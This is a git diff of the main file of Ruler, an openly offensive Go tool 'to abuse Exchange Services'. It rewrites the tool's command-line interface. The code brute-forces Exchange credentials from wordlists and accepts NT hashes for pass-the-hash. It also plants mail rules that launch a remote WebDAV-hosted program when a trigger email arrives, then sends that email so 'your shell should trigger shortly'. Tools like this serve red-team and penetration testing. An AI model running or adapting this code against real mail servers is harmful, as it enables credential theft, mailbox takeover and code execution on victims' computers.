@@ -2,20 +2,20 @@ package main
 
 import (
 	"encoding/hex"
-	"flag"
 	"fmt"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/sensepost/ruler/autodiscover"
 	"github.com/sensepost/ruler/mapi"
 	"github.com/sensepost/ruler/utils"
+	"github.com/urfave/cli"
 )
 
 //globals
-var config utils.Config
+var config utils.Session
 
-//doRequest to a target domain
 func exit(err error) {
 	//we had an error and we don't have a MAPI session
 	if err != nil {
@@ -30,22 +30,18 @@ func exit(err error) {
 	os.Exit(exitcode)
 }
 
-func sendMail() {
-	//msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: %s\r\nMIME-Version: 1.0\r\nContent-Type: text/plain\r\nContent-Transfer-Encoding:8bit\r\n\r\nsome text\r\n", from, to, subject)
-
-	/*	err := smtp.SendMail(smtp, auth, from, []string{to}, msg)
-		if err != nil {
-			log.Fatal(err)
-		}
-	*/
-}
-
 func getMapiHTTP(autoURLPtr string) *utils.AutodiscoverResp {
 	var resp *utils.AutodiscoverResp
 	var err error
 	fmt.Println("[*] Retrieving MAPI/HTTP info")
 	if autoURLPtr == "" {
-		resp, err = autodiscover.MAPIDiscover(config.Domain)
+		//rather use the email address's domain here and --domain is the authentication domain
+		lastBin := strings.LastIndex(config.Email, "@")
+		if lastBin == -1 {
+			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
+		}
+		maildomain := config.Email[lastBin+1:]
+		resp, err = autodiscover.MAPIDiscover(maildomain)
 	} else {
 		resp, err = autodiscover.MAPIDiscover(autoURLPtr)
 	}
@@ -65,7 +61,13 @@ func getRPCHTTP(autoURLPtr string) *utils.AutodiscoverResp {
 	var err error
 	fmt.Println("[*] Retrieving RPC/HTTP info")
 	if autoURLPtr == "" {
-		resp, err = autodiscover.Autodiscover(config.Domain)
+		//rather use the email address's domain here and --domain is the authentication domain
+		lastBin := strings.LastIndex(config.Email, "@")
+		if lastBin == -1 {
+			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
+		}
+		maildomain := config.Email[lastBin+1:]
+		resp, err = autodiscover.Autodiscover(maildomain)
 	} else {
 		resp, err = autodiscover.Autodiscover(autoURLPtr)
 	}
@@ -77,197 +79,460 @@ func getRPCHTTP(autoURLPtr string) *utils.AutodiscoverResp {
 	if resp.Response.Error != (utils.AutoError{}) {
 		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
 	}
+
+	url := ""
+	user := ""
+	for _, v := range resp.Response.Account.Protocol {
+		if v.Type == "EXPR" {
+			if v.SSL == "Off" {
+				url = "http://" + v.Server
+			} else {
+				url = "https://" + v.Server
+			}
+
+		}
+		if v.Type == "EXCH" {
+			user = v.Server
+		}
+	}
+	//url = "https://192.168.124.1"
+	config.RPCURL = fmt.Sprintf("%s/rpc/rpcproxy.dll?%s:6001", url, user)
+	config.RPCMailbox = user
+	fmt.Printf("[+] RPC URL set: %s\n", config.RPCURL)
 	return resp
 }
 
-func main() {
-	domainPtr := flag.String("domain", "", "The target domain (usually the email address domain)")
-	checkOnly := flag.Bool("check", false, "Checks to see if we can login and MAPI/HTTP is available")
-	adminPtr := flag.Bool("admin", false, "Try login as an administrator")
-	userPtr := flag.String("user", "", "A valid username")
-	passPtr := flag.String("pass", "", "A valid password")
-	ruleName := flag.String("rule", "", "A name for our rule")
-	delRule := flag.String("delete", "", "Delete a rule, requires the ruleid as shown with -display")
-	triggerWord := flag.String("trigger", "", "A keyword to trigger on")
-	triggerLocation := flag.String("loc", "", "A location for our remote file")
-	emailPtr := flag.String("email", "", "The target email address, used to select correct mailbox")
-	autoURLPtr := flag.String("url", "", "If you know the Autodiscover URL, supply it here. Default behaviour is to try and find it via the domain")
-	autodiscoverOnly := flag.Bool("autodiscover", false, "Only does the autodiscover, useful for checking if you can actually interact with the domain")
-	displayRules := flag.Bool("display", false, "Display the current rules")
-	tcpPtr := flag.Bool("tcp", false, "If set, we'll use TCP for the MAPI requests. Otherwise, we stick to MAPI over HTTP")
-	basicPtr := flag.Bool("basic", false, "Don't try NTLM, just do straight Basic")
-	insecurePtr := flag.Bool("insecure", false, "Don't verify SSL/TLS cerificate")
-	brutePtr := flag.Bool("brute", false, "Try bruteforce usernames/passwords")
-	stopSuccessPtr := flag.Bool("stop", false, "Stop on successfully finding a username/password")
-	userList := flag.String("usernames", "", "Filename for a List of usernames")
-	passList := flag.String("passwords", "", "Filename for a List of passwords")
-	userpassList := flag.String("userpass", "", "Filename for a List of username:password combinations separated by a colon, one pair per line")
-	verbosePtr := flag.Bool("v", false, "Be verbose, show failures")
-	conscPtr := flag.Int("attempts", 2, "Number of attempts before delay")
-	delayPtr := flag.Int("delay", 5, "Delay between attempts")
-	autoSendPtr := flag.Bool("send", false, "Autosend an email once the rule has been created")
-	//createfPtr := flag.Bool("cf", false, "create a folder")
+//function to perform a bruteforce
+func brute(c *cli.Context) error {
+	if c.String("users") == "" && c.String("userpass") == "" {
+		return fmt.Errorf("Either --users or --userpass required")
+	}
+	if c.String("passwords") == "" && c.String("userpass") == "" {
+		return fmt.Errorf("Either --passwords or --userpass required")
 
-	flag.Parse()
-
-	if *domainPtr == "" && *autoURLPtr == "" {
-		exit(fmt.Errorf("[x] Domain required or autodiscover URL required"))
+	}
+	if c.GlobalString("domain") == "" && c.GlobalString("url") == "" {
+		return fmt.Errorf("Either --domain or --url required")
 	}
 
-	if *brutePtr == true {
-		fmt.Println("[*] Starting bruteforce")
-		if *userpassList == "" {
-			autodiscover.BruteForce(*domainPtr, *userList, *passList, *basicPtr, *insecurePtr, *stopSuccessPtr, *verbosePtr, *conscPtr, *delayPtr)
-			return
+	fmt.Println("[*] Starting bruteforce")
+	userpass := c.String("userpass")
+
+	if userpass == "" {
+		if c.GlobalString("domain") != "" {
+			autodiscover.BruteForce(c.GlobalString("domain"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
 		} else {
-			autodiscover.UserPassBruteForce(*domainPtr, *userpassList, *basicPtr, *insecurePtr, *stopSuccessPtr, *verbosePtr, *conscPtr, *delayPtr)
-			return
+			autodiscover.BruteForce(c.GlobalString("url"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
+		}
+	} else {
+		if c.GlobalString("domain") != "" {
+			autodiscover.UserPassBruteForce(c.GlobalString("domain"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
+		} else {
+			autodiscover.UserPassBruteForce(c.GlobalString("url"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
 		}
 	}
+	return nil
+}
 
-	config.Domain = *domainPtr
-	config.User = *userPtr
-	config.Pass = *passPtr
-	config.Email = *emailPtr
-	config.Basic = *basicPtr
-	config.Insecure = *insecurePtr
-	config.Verbose = *verbosePtr
-	config.Admin = *adminPtr
+//Function to add new rule
+func addRule(c *cli.Context) error {
+
+	fmt.Println("[*] Adding Rule")
+	//delete message on delivery
+	res, err := mapi.ExecuteMailRuleAdd(c.String("name"), c.String("trigger"), c.String("location"), true)
+	if res.StatusCode != 0 {
+		return fmt.Errorf("[x] Failed to create rule. %s", err)
+	}
+	if err != nil {
+		return err
+	}
+	fmt.Println("[*] Rule Added. Fetching list of rules...")
+	rules, err := mapi.DisplayRules()
+	if err != nil {
+		return err
+	}
+	fmt.Printf("[+] Found %d rules\n", len(rules))
+	for _, v := range rules {
+		fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
+	}
+
+	if c.Bool("send") {
+		sendMessage(c.String("trigger"))
+	}
+
+	return nil
+}
+
+//Function to delete a rule
+func deleteRule(c *cli.Context) error {
+
+	ruleid, err := hex.DecodeString(c.String("id"))
+	if err != nil {
+		return fmt.Errorf("[x] Incorrect ruleid format. ")
+	}
+
+	err = mapi.ExecuteMailRuleDelete(ruleid)
+	if err == nil {
+		fmt.Println("[*] Rule deleted. Fetching list of remaining rules...")
+		rules, er := mapi.DisplayRules()
+		if er != nil {
+			return er
+		}
+		fmt.Printf("[+] Found %d rules\n", len(rules))
+		for _, v := range rules {
+			fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
+		}
+		return nil
+	}
+	return err
+}
+
+//Function to display all rules
+func displayRules(c *cli.Context) error {
+	fmt.Println("[+] Retrieving Rules")
+	rules, er := mapi.DisplayRules()
+
+	if er != nil {
+		return er
+	}
+
+	fmt.Printf("[+] Found %d rules\n", len(rules))
+	for _, v := range rules {
+		fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
+	}
+	return er
+}
+
+func sendMessage(triggerword string) error {
+
+	fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
+	//initate a ping sequence, just incase we are on RPC/HTTP
+	//we need to keep the socket open
+	go mapi.Ping()
+	time.Sleep(time.Second * (time.Duration)(30))
+	fmt.Println("[*] Sending email")
+
+	propertyTags := make([]mapi.PropertyTag, 1)
+	propertyTags[0] = mapi.PidTagDisplayName
+	//propertyTags[1] = mapi.PidTagSubfolders
+	_, er := mapi.GetFolder(mapi.OUTBOX, nil) //propertyTags)
+	if er != nil {
+		fmt.Println(er)
+		return er
+	}
+	_, er = mapi.SendMessage(triggerword)
+	if er != nil {
+		return er
+	}
+	fmt.Println("[*] Message sent, your shell should trigger shortly.")
+
+	return nil
+}
+
+//Function to connect to the Exchange server
+func connect(c *cli.Context) error {
+
+	//check that name, trigger and location were supplied
+	if c.GlobalString("username") == "" || (c.GlobalString("password") == "" && c.GlobalString("hash") == "") || c.GlobalString("email") == "" {
+		return fmt.Errorf("Missing global argument. Use --domain, --username, (--password or --hash) and --email")
+	}
+
+	//setup our autodiscover service
+	config.Domain = c.GlobalString("domain")
+	config.User = c.GlobalString("username")
+	config.Pass = c.GlobalString("password")
+	config.Email = c.GlobalString("email")
+	config.NTHash, _ = hex.DecodeString(c.GlobalString("hash"))
+	config.Basic = c.GlobalBool("basic")
+	config.Insecure = c.GlobalBool("insecure")
+	config.Verbose = c.GlobalBool("verbose")
+	config.Admin = c.GlobalBool("admin")
+	config.RPCEncrypt = c.GlobalBool("encrypt")
+
+	url := c.GlobalString("url")
 
 	autodiscover.SessionConfig = &config
 
 	var resp *utils.AutodiscoverResp
-	var err error
+	//var err error
+	//try connect to MAPI/HTTP first -- this is faster and the code-base is more stable
+	//unless of course the global "RPC" flag has been set, which specifies we should just use
+	//RPC/HTTP from the get-go
+	if !c.GlobalBool("rpc") {
+		var mapiURL, abkURL, userDN string
 
-	if *autodiscoverOnly == true {
+		resp = getMapiHTTP(url)
+		mapiURL = mapi.ExtractMapiURL(resp)
+		abkURL = mapi.ExtractMapiAddressBookURL(resp)
+		userDN = resp.Response.User.LegacyDN
 
-		resp = getRPCHTTP(*autoURLPtr)
-		fmt.Printf("[*] Autodiscover enabled and we could Authenticate.\nAutodiscover returned: %s", resp.Response.User)
-		os.Exit(0)
-
-	}
-
-	if *tcpPtr == false {
-		resp = getMapiHTTP(*autoURLPtr)
-		mapiURL := mapi.ExtractMapiURL(resp)
-		if mapiURL == "" {
-			exit(fmt.Errorf("[x] No MAPI URL found. Exiting"))
-			//try RPC
-			//fmt.Println("[x] No MAPI URL found. Trying RPC/HTTP")
-			//resp = getRPCHTTP(*autoURLPtr)
-			//fmt.Println(resp.Response.Account.Protocol[0].Server)
-			//mapi.Init(config, resp.Response.User.LegacyDN, "", mapi.RPC)
+		if mapiURL == "" { //try RPC
+			fmt.Println("[x] No MAPI URL found. Trying RPC/HTTP")
+			resp = getRPCHTTP(url)
+			if resp.Response.User.LegacyDN == "" {
+				return fmt.Errorf("[x] Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error)
+			}
+			mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
+		} else {
+			fmt.Println("[+] MAPI URL found: ", mapiURL)
+			fmt.Println("[+] MAPI AddressBook URL found: ", abkURL)
+			mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
 		}
-		fmt.Println("[+] MAPI URL found: ", mapiURL)
-		if *checkOnly == true {
-			fmt.Println("[+] Authentication succeeded and MAPI/HTTP is available")
-			os.Exit(0)
-		}
-		mapi.Init(config, resp.Response.User.LegacyDN, mapiURL, mapi.HTTP)
+
 	} else {
-		exit(fmt.Errorf("[x] RPC/HTTP not yet supported. "))
-		/*
-			resp = getRPCHTTP(*autoURLPtr)
-			fmt.Println(resp.Response.Account.Protocol[0].Server)
-			mapi.Init(config, resp.Response.User.LegacyDN, "", mapi.RPC)
-		*/
+		fmt.Println("[*] RPC/HTTP forced, trying RPC/HTTP")
+		resp = getRPCHTTP(url)
+		mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
 	}
 
+	//now we should do the login
 	logon, err := mapi.Authenticate()
+
 	if err != nil {
 		exit(err)
 	} else if logon.MailboxGUID != nil {
 		fmt.Println("[*] And we are authenticated")
-		fmt.Printf("[+] Mailbox GUID: %x\n", logon.MailboxGUID)
+		//fmt.Printf("[+] Mailbox GUID: %x\n", logon.MailboxGUID)
 		fmt.Println("[*] Openning the Inbox")
 
 		propertyTags := make([]mapi.PropertyTag, 2)
 		propertyTags[0] = mapi.PidTagDisplayName
 		propertyTags[1] = mapi.PidTagSubfolders
 		mapi.GetFolder(mapi.INBOX, propertyTags) //Open Inbox
-
-		//Display All rules
-		if *displayRules == true {
-			fmt.Println("[+] Retrieving Rules")
-			rules, er := mapi.DisplayRules()
-			if er != nil {
-				exit(er)
-			}
-			fmt.Printf("[+] Found %d rules\n", len(rules))
-			for _, v := range rules {
-				fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
-			}
-			exit(nil)
-		}
-		//Delete A rule
-		if *delRule != "" {
-			ruleid, err1 := hex.DecodeString(*delRule)
-			if err1 != nil {
-				exit(fmt.Errorf("[x] Incorrect ruleid format. "))
-			}
-
-			err = mapi.ExecuteMailRuleDelete(ruleid)
-			if err == nil {
-				fmt.Println("[*] Rule deleted. Fetching list of remaining rules...")
-				rules, er := mapi.DisplayRules()
-				if er != nil {
-					exit(er)
-				}
-				fmt.Printf("[+] Found %d rules\n", len(rules))
-				for _, v := range rules {
-					fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
-				}
-				exit(nil)
-			} else {
-				exit(err)
-			}
-
-		}
-
-		//Create a new rule
-		if *ruleName != "" {
-			fmt.Println("[*] Adding Rule")
-			//delete message on delivery
-			res, err := mapi.ExecuteMailRuleAdd(*ruleName, *triggerWord, *triggerLocation, true)
-			if res.StatusCode != 0 {
-				exit(fmt.Errorf("[x] Failed to create rule. %s", err))
-			}
-			if err != nil {
-				exit(err)
-			}
-			fmt.Println("[*] Rule Added. Fetching list of rules...")
-			rules, err := mapi.DisplayRules()
-			if err != nil {
-				exit(err)
-			}
-			fmt.Printf("[+] Found %d rules\n", len(rules))
-			for _, v := range rules {
-				fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
-			}
-
-			if *autoSendPtr == true {
-				fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
-				time.Sleep(time.Second * (time.Duration)(30))
-				fmt.Println("[*] Sending email")
-
-				_, er := mapi.GetFolder(mapi.OUTBOX, nil)
-				if er != nil {
-					exit(er)
-				}
-				_, er = mapi.SendMessage(*triggerWord)
-				if er != nil {
-					exit(er)
-				}
-				//mapi.ReleaseObject(0x00)
-				//mapi.SendMessage(message.MessageID)
-
-				fmt.Println("[*] Message sent, your shell should trigger shortly.")
-				exit(nil)
-			}
-			exit(nil)
-		}
-	} else {
-		exit(fmt.Errorf("[x] An error occurred during authentication"))
 	}
+	return nil
+}
+
+func main() {
+	app := cli.NewApp()
+	app.Name = "ruler"
+	app.Usage = "A tool to abuse Exchange Services"
+	app.Version = "2.0"
+	app.Author = "Etienne Stalmans <etienne@sensepost.com>"
+	app.Description = `         _
+ _ __ _   _| | ___ _ __
+| '__| | | | |/ _ \ '__|
+| |  | |_| | |  __/ |
+|_|   \__,_|_|\___|_|
+
+A tool by @sensepost to abuse Exchange Services.`
+
+	app.Flags = []cli.Flag{
+		cli.StringFlag{
+			Name:  "domain,d",
+			Value: "",
+			Usage: "A domain for the user (usually required for domain\\username)",
+		},
+		cli.StringFlag{
+			Name:  "username,u",
+			Value: "",
+			Usage: "A valid username",
+		},
+		cli.StringFlag{
+			Name:  "password,p",
+			Value: "",
+			Usage: "A valid password",
+		},
+		cli.StringFlag{
+			Name:  "hash",
+			Value: "",
+			Usage: "A NT hash for pass the hash (NTLMv1)",
+		},
+		cli.StringFlag{
+			Name:  "email,e",
+			Value: "",
+			Usage: "The target's email address",
+		},
+		cli.StringFlag{
+			Name:  "url",
+			Value: "",
+			Usage: "If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml",
+		},
+		cli.BoolFlag{
+			Name:  "insecure,k",
+			Usage: "Ignore server SSL certificate errors",
+		},
+		cli.BoolFlag{
+			Name:  "encrypt",
+			Usage: "Use NTLM auth on the RPC level - some environments require this",
+		},
+		cli.BoolFlag{
+			Name:  "basic,b",
+			Usage: "Force Basic authentication",
+		},
+		cli.BoolFlag{
+			Name:  "admin",
+			Usage: "Login as an admin",
+		},
+		cli.BoolFlag{
+			Name:  "rpc",
+			Usage: "Force RPC/HTTP rather than MAPI/HTTP",
+		},
+		cli.BoolFlag{
+			Name:  "verbose",
+			Usage: "Be verbose and show some of thei inner workings",
+		},
+	}
+
+	app.Commands = []cli.Command{
+		{
+			Name:    "add",
+			Aliases: []string{"a"},
+			Usage:   "add a new rule",
+			Flags: []cli.Flag{
+				cli.StringFlag{
+					Name:  "name,n",
+					Value: "Delete Spam",
+					Usage: "A name for our rule",
+				},
+				cli.StringFlag{
+					Name:  "trigger,t",
+					Value: "Hey John",
+					Usage: "A trigger word or phrase - this is going to be the subject of our trigger email",
+				},
+				cli.StringFlag{
+					Name:  "location,l",
+					Value: "C:\\Windows\\System32\\calc.exe",
+					Usage: "The location of our application to launch. Typically a WEBDAV URI",
+				},
+				cli.BoolFlag{
+					Name:  "send,s",
+					Usage: "Trigger the rule by sending an email to the target",
+				},
+			},
+			Action: func(c *cli.Context) error {
+				//check that name, trigger and location were supplied
+				if c.String("name") == "" || c.String("trigger") == "" || c.String("location") == "" {
+					cli.NewExitError("Missing rule item. Use --name, --trigger and --location", 1)
+				}
+
+				err := connect(c)
+				if err != nil {
+					return cli.NewExitError(err, 1)
+				}
+				err = addRule(c)
+				exit(err)
+				return nil
+			},
+		},
+		{
+			Name:    "delete",
+			Aliases: []string{"r"},
+			Usage:   "delete an existing rule",
+			Flags: []cli.Flag{
+				cli.StringFlag{
+					Name:  "id",
+					Value: "",
+					Usage: "The ID of the rule to delete",
+				},
+			},
+			Action: func(c *cli.Context) error {
+				//check that ID was supplied
+				if c.String("id") == "" {
+					return cli.NewExitError("Rule id required. Use --id", 1)
+				}
+				err := connect(c)
+				if err != nil {
+					return cli.NewExitError(err, 1)
+				}
+				err = deleteRule(c)
+				exit(err)
+				return nil
+			},
+		},
+		{
+			Name:    "display",
+			Aliases: []string{"d"},
+			Usage:   "display all existing rules",
+			Action: func(c *cli.Context) error {
+				err := connect(c)
+				if err != nil {
+					return cli.NewExitError(err, 1)
+				}
+				err = displayRules(c)
+				exit(err)
+				return nil
+			},
+		},
+		{
+			Name:    "check",
+			Aliases: []string{"c"},
+			Usage:   "Check if the credentials work and we can interact with the mailbox",
+			Action: func(c *cli.Context) error {
+				fmt.Println("completed task: ", c.Args().First())
+				return nil
+			},
+		},
+		{
+			Name:    "brute",
+			Aliases: []string{"b"},
+			Usage:   "Do a bruteforce attack against the autodiscover service to find valid username/passwords",
+			Flags: []cli.Flag{
+				cli.StringFlag{
+					Name:  "users,u",
+					Value: "",
+					Usage: "Filename for a username list (one name per line)",
+				},
+				cli.StringFlag{
+					Name:  "passwords,p",
+					Value: "",
+					Usage: "Filename for a password list (one password per line)",
+				},
+				cli.StringFlag{
+					Name:  "userpass",
+					Value: "",
+					Usage: "Filename for a username:password list (one per line)",
+				},
+				cli.IntFlag{
+					Name:  "attempts,a",
+					Value: 3,
+					Usage: "Number of attempts before delay",
+				},
+				cli.IntFlag{
+					Name:  "delay,d",
+					Value: 5,
+					Usage: "Number of seconds to delay between attempts",
+				},
+				cli.BoolFlag{
+					Name:  "stop,s",
+					Usage: "Stop on success",
+				},
+				cli.BoolFlag{
+					Name:  "verbose,v",
+					Usage: "Display each attempt",
+				},
+			},
+			Action: func(c *cli.Context) error {
+
+				err := brute(c)
+				if err != nil {
+					return cli.NewExitError(err, 1)
+				}
+				//fmt.Println("completed task: ", c.String("users"))
+				return nil
+			},
+		},
+		{
+			Name:  "abk",
+			Usage: "Interact with the Global Address Book",
+			Subcommands: []cli.Command{
+				{
+					Name:  "list",
+					Usage: "list the entries of the GAL",
+					Action: func(c *cli.Context) error {
+						fmt.Println("new task template: ", c.Args().First())
+						return nil
+					},
+				},
+			},
+		},
+	}
+
+	app.Action = func(c *cli.Context) error {
+		cli.ShowAppHelp(c)
+		return nil
+	}
+
+	app.Run(os.Args)
 
 }
